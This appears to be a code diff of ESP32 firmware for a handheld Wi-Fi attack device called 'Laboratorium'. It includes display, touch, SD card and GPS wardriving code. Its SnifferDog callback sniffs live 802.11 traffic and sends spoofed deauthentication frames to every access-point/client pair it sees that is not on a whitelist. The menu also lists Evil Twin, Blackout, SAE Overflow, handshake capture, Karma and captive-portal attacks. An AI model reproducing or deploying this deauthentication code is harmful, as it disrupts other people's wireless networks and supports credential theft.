+    //print_memory_stats();
+    
+    const esp_lcd_panel_dev_config_t panel_config = {
+        .reset_gpio_num = LCD_RST,
+        .rgb_ele_order = LCD_RGB_ELEMENT_ORDER_BGR, 
+        .bits_per_pixel = 16,
+    };
+
+    
+    // Memory barrier and heap validation BEFORE
+    asm volatile("fence" ::: "memory");
+
+    ESP_ERROR_CHECK(esp_lcd_new_panel_ili9341(io_handle, &panel_config, &panel_handle));
+    
+    // Memory barrier and heap validation AFTER
+    asm volatile("fence" ::: "memory");
+        
+    ESP_ERROR_CHECK(esp_lcd_panel_reset(panel_handle));
+    
+    ESP_ERROR_CHECK(esp_lcd_panel_init(panel_handle));
+
+    asm volatile("fence" ::: "memory");
+    
+    ESP_ERROR_CHECK(esp_lcd_panel_invert_color(panel_handle, true));  // Enable color inversion to fix RGB/BGR swap
+    ESP_ERROR_CHECK(esp_lcd_panel_mirror(panel_handle, true, true));
+    ESP_ERROR_CHECK(esp_lcd_panel_swap_xy(panel_handle, true));
+    
+    // Display will be turned on after UI is fully created (prevents boot flash)
+    
+    vTaskDelay(pdMS_TO_TICKS(50));
+}
+
+
+void print_memory_stats(void) {
+    // Heap info
+    ESP_LOGI("MEM", "=== HEAP STATUS ===");
+    ESP_LOGI("MEM", "Free heap: %lu bytes", esp_get_free_heap_size());
+    ESP_LOGI("MEM", "Min free heap: %lu bytes", esp_get_minimum_free_heap_size());
+    
+    // Internal RAM
+    ESP_LOGI("MEM", "Internal free: %lu bytes", 
+             heap_caps_get_free_size(MALLOC_CAP_INTERNAL));
+    ESP_LOGI("MEM", "Internal min: %lu bytes", 
+             heap_caps_get_minimum_free_size(MALLOC_CAP_INTERNAL));
+    
+    // PSRAM
+    ESP_LOGI("MEM", "PSRAM free: %lu bytes", 
+             heap_caps_get_free_size(MALLOC_CAP_SPIRAM));
+    ESP_LOGI("MEM", "PSRAM min: %lu bytes", 
+             heap_caps_get_minimum_free_size(MALLOC_CAP_SPIRAM));
+    
+    // DMA-capable
+    ESP_LOGI("MEM", "DMA-capable free: %lu bytes", 
+             heap_caps_get_free_size(MALLOC_CAP_DMA));
+}
+
+// Helper functions for Wardrive
+static void get_timestamp_string(char* buffer, size_t size) {
+    static uint32_t timestamp_counter = 0;
+    timestamp_counter++;
+    snprintf(buffer, size, "2025-09-26 %02d:%02d:%02d", 
+             (int)((timestamp_counter / 3600) % 24),
+             (int)((timestamp_counter / 60) % 60), 
+             (int)(timestamp_counter % 60));
+}
+
+static const char* get_auth_mode_wiggle(wifi_auth_mode_t mode) {
+    switch(mode) {
+        case WIFI_AUTH_OPEN:
+            return "Open";
+        case WIFI_AUTH_WEP:
+            return "WEP";
+        case WIFI_AUTH_WPA_PSK:
+            return "WPA_PSK";
+        case WIFI_AUTH_WPA2_PSK:
+            return "WPA2_PSK";
+        case WIFI_AUTH_WPA_WPA2_PSK:
+            return "WPA_WPA2_PSK";
+        case WIFI_AUTH_WPA2_ENTERPRISE:
+            return "WPA2_ENTERPRISE";
+        case WIFI_AUTH_WPA3_PSK:
+            return "WPA3_PSK";
+        case WIFI_AUTH_WPA2_WPA3_PSK:
+            return "WPA2_WPA3_PSK";
+        case WIFI_AUTH_WAPI_PSK:
+            return "WAPI_PSK";
+        default:
+            return "Unknown";
+    }
+}
+
+static bool wait_for_gps_fix(int timeout_seconds) {
+    int elapsed = 0;
+    current_gps.valid = false;
+    
+    ESP_LOGI(TAG, "Waiting for GPS fix (timeout: %d seconds)...", timeout_seconds);
+    
+    while (elapsed < timeout_seconds) {
+        if (!wardrive_active) {
+            ESP_LOGI(TAG, "GPS wait: Stop requested");
+            return false;
+        }
+        
+        int len = uart_read_bytes(GPS_UART_NUM, (uint8_t*)wardrive_gps_buffer, GPS_BUF_SIZE - 1, pdMS_TO_TICKS(1000));
+        if (len > 0) {
+            wardrive_gps_buffer[len] = '\0';
+            char* line = strtok(wardrive_gps_buffer, "\r\n");
+            while (line != NULL) {
+                if (parse_gps_nmea(line)) {
+                    if (current_gps.valid) {
+                        return true;
+                    }
+                }
+                line = strtok(NULL, "\r\n");
+            }
+        }
+        
+        elapsed++;
+        if (elapsed % 10 == 0) {
+            ESP_LOGI(TAG, "Still waiting for GPS fix... (%d/%d seconds)", elapsed, timeout_seconds);
+        }
+    }
+    
+    return false;
+}
+
+// Snifferdog channel hopping
+static void sniffer_dog_channel_hop(void) {
+    if (!sniffer_dog_active) {
+        return;
+    }
+    
+    sniffer_dog_current_channel = dual_band_channels[sniffer_dog_channel_index];
+    sniffer_dog_channel_index++;
+    if (sniffer_dog_channel_index >= dual_band_channels_count) {
+        sniffer_dog_channel_index = 0;
+    }
+    
+    esp_wifi_set_channel(sniffer_dog_current_channel, WIFI_SECOND_CHAN_NONE);
+    sniffer_dog_last_channel_hop = esp_timer_get_time() / 1000;
+}
+
+// Snifferdog channel hopping task
+static void sniffer_dog_task(void *pvParameters) {
+    (void)pvParameters;
+    
+    ESP_LOGI(TAG, "SnifferDog channel hop task started");
+    
+    while (sniffer_dog_active) {
+        vTaskDelay(pdMS_TO_TICKS(50));
+        
+        if (!sniffer_dog_active) {
+            continue;
+        }
+        
+        int64_t current_time = esp_timer_get_time() / 1000;
+        bool time_expired = (current_time - sniffer_dog_last_channel_hop >= sniffer_channel_hop_delay_ms);
+        
+        if (time_expired) {
+            sniffer_dog_channel_hop();
+        }
+    }
+    
+    ESP_LOGI(TAG, "SnifferDog channel hop task ending");
+    sniffer_dog_task_handle = NULL;
+    vTaskDelete(NULL);
+}
+
+// Snifferdog promiscuous callback - captures AP-STA pairs and sends deauth
+static void sniffer_dog_promiscuous_callback(void *buf, wifi_promiscuous_pkt_type_t type) {
+    static uint32_t deauth_sent_count = 0;
+    
+    if (!sniffer_dog_active) {
+        return;
+    }
+    
+    // Filter only MGMT and DATA packets
+    if (type != WIFI_PKT_DATA && type != WIFI_PKT_MGMT) {
+        return;
+    }
+    
+    const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
+    const uint8_t *frame = pkt->payload;
+    int len = pkt->rx_ctrl.sig_len;
+    
+    if (len < 24) {
+        return;
+    }
+    
+    // Parse 802.11 header
+    uint8_t frame_type = frame[0] & 0xFC;
+    uint8_t to_ds = (frame[1] & 0x01) != 0;
+    uint8_t from_ds = (frame[1] & 0x02) != 0;
+    
+    // Extract addresses
+    uint8_t *addr1 = (uint8_t *)&frame[4];
+    uint8_t *addr2 = (uint8_t *)&frame[10];
+    
+    uint8_t *ap_mac = NULL;
+    uint8_t *sta_mac = NULL;
+    
+    // Identify AP and STA based on frame type and DS bits
+    if (type == WIFI_PKT_DATA) {
+        if (to_ds && !from_ds) {
+            sta_mac = addr2;
+            ap_mac = addr1;
+        } else if (!to_ds && from_ds) {
+            ap_mac = addr2;
+            sta_mac = addr1;
+        } else {
+            return;
+        }
+    } else if (type == WIFI_PKT_MGMT) {
+        switch (frame_type) {
+            case 0x00: // Association Request
+            case 0x20: // Reassociation Request
+            case 0xB0: // Authentication
+                sta_mac = addr2;
+                ap_mac = addr1;
+                break;
+            case 0x10: // Association Response
+            case 0x30: // Reassociation Response
+                ap_mac = addr2;
+                sta_mac = addr1;
+                break;
+            default:
+                return;
+        }
+    }
+    
+    if (!ap_mac || !sta_mac) {
+        return;
+    }
+    
+    // Skip broadcast/multicast addresses
+    if (is_broadcast_bssid(ap_mac) || is_broadcast_bssid(sta_mac) ||
+        is_multicast_mac(ap_mac) || is_multicast_mac(sta_mac) ||
+        is_own_device_mac(ap_mac) || is_own_device_mac(sta_mac)) {
+        return;
+    }
+    
+    // Check if AP BSSID is whitelisted
+    if (is_bssid_whitelisted(ap_mac)) {
+        return;
+    }
+    
+    // Send deauth frame from AP to STA
+    uint8_t deauth_frame[sizeof(deauth_frame_default)];
+    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
+    
+    memcpy(&deauth_frame[4], sta_mac, 6);   // Destination: specific STA
+    memcpy(&deauth_frame[10], ap_mac, 6);   // Source: AP
+    memcpy(&deauth_frame[16], ap_mac, 6);   // BSSID: AP
+    
+    esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame_default), false);
+    deauth_sent_count++;
+    
+    // Log deauth
+    ESP_LOGI(TAG, "[SnifferDog #%lu] DEAUTH: AP=%02X:%02X:%02X:%02X:%02X:%02X -> STA=%02X:%02X:%02X:%02X:%02X:%02X (Ch=%d, RSSI=%d)",
+             deauth_sent_count,
+             ap_mac[0], ap_mac[1], ap_mac[2], ap_mac[3], ap_mac[4], ap_mac[5],
+             sta_mac[0], sta_mac[1], sta_mac[2], sta_mac[3], sta_mac[4], sta_mac[5],
+             sniffer_dog_current_channel, pkt->rx_ctrl.rssi);
+}
+
+// Sniffer task - calls wifi_sniffer_start and runs until stopped
+static void sniffer_task(void *pvParameters) {
+    (void)pvParameters;
+    
+    ESP_LOGI(TAG, "Sniffer task started");
+    
+    // Start wifi_sniffer
+    esp_err_t ret = wifi_sniffer_start();
+    if (ret != ESP_OK) {
+        ESP_LOGE(TAG, "Failed to start wifi_sniffer: %s", esp_err_to_name(ret));
+        sniffer_task_active = false;
+        sniffer_task_handle = NULL;
+        vTaskDelete(NULL);
+        return;
+    }
+    
+    // Keep task running until sniffer_task_active is set to false
+    while (sniffer_task_active) {
+        vTaskDelay(pdMS_TO_TICKS(1000));
+    }
+    
+    // Stop wifi_sniffer
+    wifi_sniffer_stop();
+    
+    ESP_LOGI(TAG, "Sniffer task ending");
+    sniffer_task_handle = NULL;
+    vTaskDelete(NULL);
+}
+
+static void init_i2c(void)
+{
+    // Use OLD I2C API (more stable, less memory overhead)
+    i2c_config_t conf = {
+        .mode = I2C_MODE_MASTER,
+        .sda_io_num = CTP_SDA,
+        .scl_io_num = CTP_SCL,
+        .sda_pullup_en = GPIO_PULLUP_ENABLE,
+        .scl_pullup_en = GPIO_PULLUP_ENABLE,
+        .master.clk_speed = 400000,  // 400kHz
+    };
+    
+
+    ESP_LOGI(TAG, "Initializing I2C (old API) on SDA=%d, SCL=%d", CTP_SDA, CTP_SCL);
+
+    esp_err_t ret = i2c_param_config(I2C_NUM_0, &conf);
+    if (ret != ESP_OK) {
+        ESP_LOGE(TAG, "I2C param config failed: %s", esp_err_to_name(ret));
+        return;
+    }
+    
+    ret = i2c_driver_install(I2C_NUM_0, conf.mode, 0, 0, 0);
+    if (ret != ESP_OK) {
+        ESP_LOGE(TAG, "I2C driver install failed: %s", esp_err_to_name(ret));
+        return;
+    }
+    
+    ESP_LOGI(TAG, "I2C bus initialized successfully");
+}
+
+static void init_touch(void)
+{
+    esp_err_t ret = ft6336_init(&touch_handle, I2C_NUM_0, CTP_INT, CTP_RST,
+                                LCD_H_RES, LCD_V_RES);
+    if (ret != ESP_OK) {
+        ESP_LOGE(TAG, "Touch init failed: %s", esp_err_to_name(ret));
+    } else {
+        ESP_LOGI(TAG, "FT6336U touch initialized");
+    }
+}
+
+static void log_sd_root_listing(void)
+{
+    DIR *dir = opendir("/sdcard");
+    if (!dir) {
+        ESP_LOGW(TAG, "opendir(/sdcard) failed");
+        return;
+    }
+    ESP_LOGI(TAG, "SD root listing:");
+    struct dirent *entry;
+    while ((entry = readdir(dir)) != NULL) {
+        char path[256];
+        int safe_len = (int)sizeof(path) - 9; // 256 - 1 (NUL) - strlen("/sdcard/") = 247
+        if (safe_len < 0) safe_len = 0;
+        snprintf(path, sizeof(path), "/sdcard/%.*s", safe_len, entry->d_name);
+        struct stat st;
+        if (stat(path, &st) == 0) {
+            if (S_ISDIR(st.st_mode)) {
+                ESP_LOGI(TAG, "  [DIR] %s", entry->d_name);
+            } else {
+                ESP_LOGI(TAG, "  %s (%ld bytes)", entry->d_name, (long)st.st_size);
+            }
+        } else {
+            ESP_LOGI(TAG, "  %s", entry->d_name);
+        }
+    }
+    closedir(dir);
+}
+
+// SD card init task with larger stack to prevent stack overflow
+static void sd_init_task(void *param)
+{
+    esp_err_t ret = wifi_wardrive_init_sd();
+    
+    if (ret == ESP_OK) {
+        ESP_LOGI(TAG, "[SD_TASK] SD card mount successful!");
+        log_sd_root_listing();
+        ESP_LOGI(TAG, "[SD_TASK] SD card ready for use");
+    } else {
+        ESP_LOGW(TAG, "[SD_TASK] SD card initialization failed with error: %s (0x%x)", 
+                 esp_err_to_name(ret), ret);
+        ESP_LOGW(TAG, "[SD_TASK] System will continue without SD card");
+    }
+    
+    ESP_LOGI(TAG, "[SD_TASK] Task complete, deleting self");
+    vTaskDelete(NULL);
+}
+
+// Load whitelist from SD card
+void load_whitelist_from_sd(void) {
+    whitelistedBssidsCount = 0; // Reset count
+    
+    ESP_LOGI(TAG, "Loading whitelist from /sdcard/lab/white.txt...");
+    
+    // SD card should already be mounted by sd_card_task
+    // Just try to open the file directly
+    FILE *file = fopen("/sdcard/lab/white.txt", "r");
+    if (file == NULL) {
+        ESP_LOGI(TAG, "white.txt not found on SD card - whitelist will be empty");
+        return;
+    }
+    
+    ESP_LOGI(TAG, "Found white.txt, loading whitelisted BSSIDs...");
+    
+    char line[128];
+    int line_number = 0;
+    int loaded_count = 0;
+    
+    while (fgets(line, sizeof(line), file) != NULL && whitelistedBssidsCount < MAX_WHITELISTED_BSSIDS) {
+        line_number++;
+        
+        // Remove trailing newline/whitespace
+        line[strcspn(line, "\r\n")] = '\0';
+        
+        // Skip empty lines
+        if (strlen(line) == 0) {
+            continue;
+        }
+        
+        // Parse BSSID in format: XX:XX:XX:XX:XX:XX or XX-XX-XX-XX-XX-XX
+        uint8_t bssid[6];
+        int matches = 0;
+        
+        // Try with colon separator
+        matches = sscanf(line, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+                        &bssid[0], &bssid[1], &bssid[2],
+                        &bssid[3], &bssid[4], &bssid[5]);
+        
+        // If that didn't work, try with dash separator
+        if (matches != 6) {
+            matches = sscanf(line, "%hhx-%hhx-%hhx-%hhx-%hhx-%hhx",
+                            &bssid[0], &bssid[1], &bssid[2],
+                            &bssid[3], &bssid[4], &bssid[5]);
+        }
+        
+        if (matches == 6) {
+            // Valid BSSID found, add to whitelist
+            memcpy(whiteListedBssids[whitelistedBssidsCount].bssid, bssid, 6);
+            whitelistedBssidsCount++;
+            loaded_count++;
+            
+            ESP_LOGI(TAG, "  [%d] Loaded: %02X:%02X:%02X:%02X:%02X:%02X",
+                     loaded_count,
+                     bssid[0], bssid[1], bssid[2],
+                     bssid[3], bssid[4], bssid[5]);
+        } else {
+            ESP_LOGI(TAG, "  Line %d: Invalid BSSID format, ignoring: %s", line_number, line);
+        }
+    }
+    
+    fclose(file);
+    
+    if (whitelistedBssidsCount > 0) {
+        ESP_LOGI(TAG, "Successfully loaded %d whitelisted BSSID(s)", whitelistedBssidsCount);
+    } else {
+        ESP_LOGI(TAG, "No valid BSSIDs found in white.txt");
+    }
+}
+
+// Check if a BSSID is in the whitelist
+bool is_bssid_whitelisted(const uint8_t *bssid) {
+    if (bssid == NULL || whitelistedBssidsCount == 0) {
+        return false;
+    }
+    
+    for (int i = 0; i < whitelistedBssidsCount; i++) {
+        if (memcmp(bssid, whiteListedBssids[i].bssid, 6) == 0) {
+            return true;
+        }
+    }
+    
+    return false;
+}
+
+void app_main(void)
+{
+	//Initialize GPS UART and start background monitor task
+	if (init_gps_uart() == ESP_OK) {
+		ESP_LOGI(TAG, "GPS UART initialized on TX=%d RX=%d", GPS_TX_PIN, GPS_RX_PIN);
+		// Allocate GPS task stack from PSRAM
+		gps_task_stack = (StackType_t *)heap_caps_malloc(4096 * sizeof(StackType_t), MALLOC_CAP_SPIRAM);
+		if (gps_task_stack != NULL) {
+			TaskHandle_t task_handle = xTaskCreateStatic(gps_task, "gps_task", 4096, NULL, 
+				tskIDLE_PRIORITY + 1, gps_task_stack, &gps_task_buffer);
+			if (task_handle == NULL) {
+				ESP_LOGE(TAG, "Failed to start GPS task");
+				heap_caps_free(gps_task_stack);
+				gps_task_stack = NULL;
+			} else {
+				ESP_LOGI(TAG, "GPS monitor running in background (PSRAM) (log every few seconds)");
+			}
+		} else {
+			ESP_LOGE(TAG, "Failed to allocate GPS task stack from PSRAM");
+		}
+	} else {
+		ESP_LOGE(TAG, "GPS UART init failed");
+	}
+    
+    // Initialize WiFi CLI system (WiFi, LED, all components)
+    esp_err_t ret = wifi_cli_init();
+    if (ret != ESP_OK) {
+        ESP_LOGE(TAG, "WiFi CLI init failed: %s", esp_err_to_name(ret));
+    } else {
+        ESP_LOGI(TAG, "WiFi CLI system initialized");
+        // Start console in background (optional)
+        // wifi_cli_start_console();
+    }
+
+    
+    // Init scanner and register event handler
+    wifi_scanner_init();
+    esp_event_handler_register(WIFI_EVENT, WIFI_EVENT_SCAN_DONE, &wifi_scan_done_cb, NULL);
+
+    // Initialize custom LVGL memory allocator EARLY
+    ESP_LOGI(TAG, "LVGL INIT");
+    lvgl_memory_init();
+    
+    // Initialize I2C BEFORE LVGL GUI to avoid memory fragmentation
+    ESP_LOGI(TAG, "Initializing I2C for capacitive touch...");
+    init_i2c();
+    init_touch();
+
+    ESP_LOGI(TAG, "LV INIT");
+    lv_init();
+    init_display();
+
+    ESP_LOGI(TAG, "Display hardware initialized");
+    
+    ESP_LOGI(TAG, "=== INITIALIZING SD CARD ===");
+    // Allocate SD init task stack from PSRAM
+    sd_init_task_stack = (StackType_t *)heap_caps_malloc(8192 * sizeof(StackType_t), MALLOC_CAP_SPIRAM);
+    if (sd_init_task_stack != NULL) {
+        TaskHandle_t task_handle = xTaskCreateStatic(sd_init_task, "sd_init", 8192, NULL, 
+            5, sd_init_task_stack, &sd_init_task_buffer);
+        if (task_handle == NULL) {
+            ESP_LOGE(TAG, "Failed to create SD init task");
+            heap_caps_free(sd_init_task_stack);
+            sd_init_task_stack = NULL;
+        } else {
+            ESP_LOGI(TAG, "SD init task created with PSRAM stack");
+        }
+    } else {
+        ESP_LOGE(TAG, "Failed to allocate SD init task stack from PSRAM");
+    }
+    
+    // Give SD init task time to complete (it will self-delete)
+    // Wait longer to ensure SD mount completes before starting LCD drawing
+    vTaskDelay(pdMS_TO_TICKS(2000));  // 2 seconds to complete SD init
+         
+    // Create LVGL mutex for thread safety
+    lvgl_mutex = xSemaphoreCreateMutex();
+    if (lvgl_mutex == NULL) {
+        ESP_LOGE(TAG, "Failed to create LVGL mutex!");
+        return;
+    }
+    
+    // Create SD/SPI mutex (SD and display share same SPI bus)
+    sd_spi_mutex = xSemaphoreCreateMutex();
+    if (sd_spi_mutex == NULL) {
+        ESP_LOGE(TAG, "Failed to create SD/SPI mutex!");
+        return;
+    }
+
+    // For 32-bit color depth, we need to reduce buffer size due to memory constraints
+    // 15 lines * 480 pixels * 4 bytes = 28.8 KB per buffer (vs 28.8 KB for 30 lines @ 16-bit)
+    const size_t buf_size = LCD_H_RES * 15 * sizeof(lv_color_t);
+    // Allocate display draw buffers strictly from internal DMA-capable memory
+    buf1 = heap_caps_malloc(buf_size, MALLOC_CAP_DMA);
+    buf2 = heap_caps_malloc(buf_size, MALLOC_CAP_DMA);
+    if (buf1 == NULL || buf2 == NULL) {
+        ESP_LOGE(TAG, "Failed to allocate draw buffers!");
+        return;
+    }
+    ESP_LOGI(TAG, "Display buffers allocated: buf1=%p, buf2=%p (size: %zu bytes each)", buf1, buf2, buf_size);
+
+    lv_disp_draw_buf_init(&draw_buf, buf1, buf2, LCD_H_RES * 15);
+    static lv_disp_drv_t disp_drv;
+    lv_disp_drv_init(&disp_drv);
+    disp_drv.hor_res = LCD_H_RES;
+    disp_drv.ver_res = LCD_V_RES;
+    disp_drv.flush_cb = lvgl_flush_cb;
+    disp_drv.draw_buf = &draw_buf;
+    disp_drv.user_data = panel_handle;
+    lv_disp_drv_register(&disp_drv);
+
+    uint16_t black = 0x0000;
+    for (int i = 0; i < LCD_H_RES * 30; i++) {
+        ((uint16_t*)buf1)[i] = black;
+    }
+    for (int y = 0; y < LCD_V_RES; y += 30) {
+        int lines = (y + 30 <= LCD_V_RES) ? 30 : (LCD_V_RES - y);
+        esp_lcd_panel_draw_bitmap(panel_handle, 0, y, LCD_H_RES, y + lines, buf1);
+    }
+    
+    lv_obj_set_style_bg_color(lv_scr_act(), lv_color_black(), 0);
+
+    ESP_LOGI(TAG, "LVGL OBJECTS:");
+
+    // Title bar
+    title_bar = lv_obj_create(lv_scr_act());
+    lv_obj_set_size(title_bar, lv_pct(100), 30);
+    lv_obj_align(title_bar, LV_ALIGN_TOP_MID, 0, 0);
+    lv_obj_set_style_bg_color(title_bar, lv_color_make(20, 20, 20), 0);
+    lv_obj_set_style_border_width(title_bar, 0, 0);
+    lv_obj_set_style_radius(title_bar, 0, 0);
+    lv_obj_clear_flag(title_bar, LV_OBJ_FLAG_SCROLLABLE);  // No scroll
+    
+    lv_obj_t *title_label = lv_label_create(title_bar);
+    lv_label_set_text(title_label, "Laboratorium");
+    lv_obj_set_style_text_color(title_label, lv_color_make(0, 255, 0), 0);
+    lv_obj_center(title_label);
+    
+    // Create main menu
+    menu_obj = lv_menu_create(lv_scr_act());
+    lv_obj_set_size(menu_obj, lv_pct(100), 290);
+    lv_obj_align(menu_obj, LV_ALIGN_BOTTOM_MID, 0, 0);
+    lv_menu_set_mode_root_back_btn(menu_obj, LV_MENU_ROOT_BACK_BTN_DISABLED);
+    // Style menu with black background
+    lv_obj_set_style_bg_color(menu_obj, lv_color_make(0, 0, 0), LV_PART_MAIN);
+    lv_obj_set_style_text_color(menu_obj, lv_color_make(0, 255, 0), LV_PART_MAIN);
+    
+    // Create Attacks sub-pages with clickable buttons
+    lv_obj_t *attacks_page = lv_menu_page_create(menu_obj, NULL);
+    lv_obj_set_style_pad_hor(attacks_page, 5, 0);
+    lv_obj_set_style_pad_ver(attacks_page, 5, 0);
+    lv_obj_set_flex_flow(attacks_page, LV_FLEX_FLOW_COLUMN);
+    lv_obj_set_flex_align(attacks_page, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_START);
+    lv_obj_set_style_bg_color(attacks_page, lv_color_make(0, 0, 0), 0);  // Black background
+    
+    lv_obj_t *item;
+    
+    item = create_clickable_item(attacks_page, LV_SYMBOL_CHARGE, "Deauther", attack_event_cb, "Deauther");
+    item = create_clickable_item(attacks_page, LV_SYMBOL_WARNING, "Evil Twin", attack_event_cb, "Evil Twin");
+    item = create_clickable_item(attacks_page, LV_SYMBOL_POWER, "Blackout", attack_event_cb, "Blackout");
+    item = create_clickable_item(attacks_page, LV_SYMBOL_EYE_OPEN, "Snifferdog", attack_event_cb, "Snifferdog");
+    item = create_clickable_item(attacks_page, LV_SYMBOL_WARNING, "SAE Overflow", attack_event_cb, "SAE Overflow");
+    item = create_clickable_item(attacks_page, LV_SYMBOL_DOWNLOAD, "Handshakes", attack_event_cb, "Handshakes");
+    item = create_clickable_item(attacks_page, LV_SYMBOL_SHUFFLE, "Karma", attack_event_cb, "Karma");
+    item = create_clickable_item(attacks_page, LV_SYMBOL_WIFI, "Portal", attack_event_cb, "Portal");
+    
+    // Create Scanner sub-page
+    lv_obj_t *scanner_page = lv_menu_page_create(menu_obj, NULL);
+    lv_obj_set_style_pad_hor(scanner_page, 5, 0);
+    lv_obj_set_style_pad_ver(scanner_page, 5, 0);
+    lv_obj_set_flex_flow(scanner_page, LV_FLEX_FLOW_COLUMN);
+    lv_obj_set_flex_align(scanner_page, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_START);
+    lv_obj_set_style_bg_color(scanner_page, lv_color_make(0, 0, 0), 0);  // Black background
+    
+    item = create_clickable_item(scanner_page, LV_SYMBOL_REFRESH, "Scan", attack_event_cb, "Scan");
+    item = create_clickable_item(scanner_page, LV_SYMBOL_LIST, "Browse Networks", attack_event_cb, "Browse Networks");
+    
+    // Create Sniffer sub-page
+    lv_obj_t *sniffer_page = lv_menu_page_create(menu_obj, NULL);
+    lv_obj_set_style_pad_hor(sniffer_page, 5, 0);
+    lv_obj_set_style_pad_ver(sniffer_page, 5, 0);
+    lv_obj_set_flex_flow(sniffer_page, LV_FLEX_FLOW_COLUMN);
+    lv_obj_set_flex_align(sniffer_page, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_START);
+    lv_obj_set_style_bg_color(sniffer_page, lv_color_make(0, 0, 0), 0);  // Black background
+    
+    item = create_clickable_item(sniffer_page, LV_SYMBOL_EYE_OPEN, "Sniffer", attack_event_cb, "Sniffer");
+    item = create_clickable_item(sniffer_page, LV_SYMBOL_LIST, "Browse Clients", attack_event_cb, "Browse Clients");
+    item = create_clickable_item(sniffer_page, LV_SYMBOL_CALL, "Show Probes", attack_event_cb, "Show Probes");
+    
+    // Create Wardrive sub-page
+    lv_obj_t *wardrive_page = lv_menu_page_create(menu_obj, NULL);
+    lv_obj_set_style_pad_hor(wardrive_page, 5, 0);
+    lv_obj_set_style_pad_ver(wardrive_page, 5, 0);
+    lv_obj_set_flex_flow(wardrive_page, LV_FLEX_FLOW_COLUMN);
+    lv_obj_set_flex_align(wardrive_page, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_START);
+    lv_obj_set_style_bg_color(wardrive_page, lv_color_make(0, 0, 0), 0);  // Black background
+    
+    item = create_clickable_item(wardrive_page, LV_SYMBOL_GPS, "Get GPS Fix", attack_event_cb, "Get GPS Fix");
+    item = create_clickable_item(wardrive_page, LV_SYMBOL_DRIVE, "Start Wardrive", attack_event_cb, "Start Wardrive");
+    
+    // Create root page
+    root_page = lv_menu_page_create(menu_obj, NULL);
+    lv_obj_set_style_pad_hor(root_page, 5, 0);
+    lv_obj_set_style_bg_color(root_page, lv_color_make(0, 0, 0), 0);  // Black background
+    
+    lv_obj_t *root_section = lv_menu_section_create(root_page);
+    lv_obj_set_style_bg_color(root_section, lv_color_make(0, 0, 0), 0);  // Black background
+    
+    item = create_menu_item(root_section, LV_SYMBOL_LIST, "Scanner & Targets");
+    lv_menu_set_load_page_event(menu_obj, item, scanner_page);
+    
+    item = create_menu_item(root_section, LV_SYMBOL_EYE_OPEN, "Sniffer");
+    lv_menu_set_load_page_event(menu_obj, item, sniffer_page);
+    
+    item = create_menu_item(root_section, LV_SYMBOL_WARNING, "Attacks");
+    lv_menu_set_load_page_event(menu_obj, item, attacks_page);
+    
+    item = create_menu_item(root_section, LV_SYMBOL_GPS, "Wardrive");
+    lv_menu_set_load_page_event(menu_obj, item, wardrive_page);
+    
+    lv_menu_set_sidebar_page(menu_obj, root_page);
+    
+    // Adjust column widths: sidebar 40% (was ~30%), main content 60% (was ~50%)
+    lv_obj_t *sidebar = lv_menu_get_sidebar_header(menu_obj);
+    if (sidebar) {
+        lv_obj_set_width(lv_obj_get_parent(sidebar), lv_pct(45));  // Sidebar 45% width
+    }
+    lv_obj_t *main_header = lv_menu_get_main_header(menu_obj);
+    if (main_header) {
+        lv_obj_set_width(lv_obj_get_parent(main_header), lv_pct(55));  // Main content 55% width
+    }
+    
+    // Hide headers after pages are created
+    lv_obj_t *header = lv_menu_get_main_header(menu_obj);
+    if (header) lv_obj_add_flag(header, LV_OBJ_FLAG_HIDDEN);
+    
+    header = lv_menu_get_sidebar_header(menu_obj);
+    if (header) lv_obj_add_flag(header, LV_OBJ_FLAG_HIDDEN);
+    
+    // DEBUG: Visual touch indicator (red dot)
+    touch_dot = lv_obj_create(lv_scr_act());
+    lv_obj_set_size(touch_dot, 10, 10);
+    lv_obj_set_style_bg_color(touch_dot, lv_color_make(255, 0, 0), 0);
+    lv_obj_set_style_border_width(touch_dot, 0, 0);
+    lv_obj_set_style_radius(touch_dot, 5, 0);
+    lv_obj_add_flag(touch_dot, LV_OBJ_FLAG_HIDDEN);
+    lv_obj_add_flag(touch_dot, LV_OBJ_FLAG_FLOATING);
+    
+    lv_obj_invalidate(lv_scr_act());
+    lv_refr_now(NULL);
+    
+    // Now that UI is fully created, turn on display (prevents boot flash)
+    ESP_ERROR_CHECK(esp_lcd_panel_disp_on_off(panel_handle, true));
+    
+    vTaskDelay(pdMS_TO_TICKS(100));
+    
+    static lv_indev_drv_t indev_drv;
+    lv_indev_drv_init(&indev_drv);
+    indev_drv.type = LV_INDEV_TYPE_POINTER;
+    indev_drv.read_cb = lvgl_touch_read_cb;
+    indev_drv.user_data = &touch_handle;
+    lv_indev_drv_register(&indev_drv);
+
+    const esp_timer_create_args_t periodic_timer_args = {
+        .callback = &lvgl_tick_task,
+        .name = "lvgl_tick"
+    };
+    esp_timer_handle_t periodic_timer;
+    ESP_ERROR_CHECK(esp_timer_create(&periodic_timer_args, &periodic_timer));
+    ESP_ERROR_CHECK(esp_timer_start_periodic(periodic_timer, 10 * 1000));
+    
+    // Load BSSID whitelist from SD card
+    load_whitelist_from_sd();
+    vTaskDelay(pdMS_TO_TICKS(500));
+    
+    // Initialize portal HTML buffer (1MB in PSRAM for large HTML files up to 900KB)
+    ESP_LOGI(TAG, "Initializing portal HTML buffer in PSRAM...");
+    esp_err_t html_ret = wifi_attacks_init_portal_html_buffer();
+    if (html_ret == ESP_OK) {
+        ESP_LOGI(TAG, "Portal HTML buffer ready (1MB PSRAM allocated)");
+    } else {
+        ESP_LOGW(TAG, "Portal HTML buffer allocation failed - large HTML files may not work");
+    }
+    
+    ESP_LOGI(TAG, "System ready!");
+    ESP_LOGI(TAG, "[DIAG] System ready - final memory state");
+    check_heap_integrity("Before main loop");
+    print_memory_stats();
+
+    // Subscribe main task to watchdog to prevent IDLE task starvation during LVGL rendering
+    esp_task_wdt_add(NULL);
+    ESP_LOGI(TAG, "Main task subscribed to watchdog");
+
+    while (1) {
+        // Thread-safe LVGL handling
+        uint32_t sleep_ms = 10;
